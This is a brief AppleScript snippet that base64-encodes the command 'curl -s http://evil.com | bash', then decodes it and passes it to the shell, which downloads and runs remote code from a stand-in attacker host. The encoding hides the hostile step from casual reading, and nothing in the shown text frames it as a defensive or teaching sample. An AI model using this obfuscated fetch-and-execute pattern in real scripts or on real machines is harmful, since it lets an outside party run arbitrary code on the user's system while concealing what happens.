-- Base64 of: curl -s http://evil.com | bash
set encoded to "Y3VybCAtcyBodHRwOi8vZXZpbC5jb20gfCBiYXNo"
-- Decode and execute it
do shell script "echo " & encoded & " | base64 -D | bash"
